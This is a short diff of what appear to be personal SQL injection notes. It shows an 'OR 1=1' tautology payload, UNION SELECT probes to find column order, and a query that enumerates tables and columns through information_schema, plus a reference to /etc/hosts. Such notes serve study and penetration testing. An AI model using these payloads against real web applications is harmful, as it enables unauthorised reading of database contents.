@@ -1,7 +1,7 @@
 - /etc/hosts
 
 product=<xx> OR 1=1 ;
-product=7 UNION SELECT 1,3,2; < ---- Guessing and checking
+product=7 UNION SELECT 1,3,2; < ---- Guessing and checking until you can see the full output
     - Output - 1,2,3
 product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns;
                               1           3          2
